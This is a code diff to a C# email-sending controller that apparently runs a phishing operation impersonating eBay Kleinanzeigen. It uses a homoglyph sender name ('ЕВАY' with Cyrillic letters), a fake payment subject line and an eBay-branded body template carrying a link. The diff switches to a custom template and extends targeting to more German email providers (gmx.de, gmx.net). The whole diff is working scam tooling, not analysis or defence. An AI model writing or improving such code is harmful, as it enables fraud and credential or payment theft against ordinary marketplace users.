@@ -70,6 +70,7 @@ public class SenderController : ControllerBase
 		var body = await GetBody(link, ServiceType.EbayDe, email);
 		
 		var displayName = "•ЕВАY◦kleinanzeigen•Info";
+		//var displayName = "Christina Klein";
 
 		var subject = "Bezahlung der Ware! #834891";
 
@@ -124,12 +125,11 @@ public class SenderController : ControllerBase
 	private async Task<string> GetBody(string link, ServiceType serviceType,
 		string email)
 	{
-		var template = EbayTemplate.Original;
-		//var template = EbayTemplate.Custom;
+		var template = EbayTemplate.Custom;
 		
 		var listEmails = new List<string>
 		{
-			"hotmail", "outlook", "web.de"
+			"hotmail", "outlook", "web.de", "gmx.de", "gmx.net"
 		};
 		
 		if (listEmails.Any(email.Contains) && serviceType == ServiceType.EbayDe)
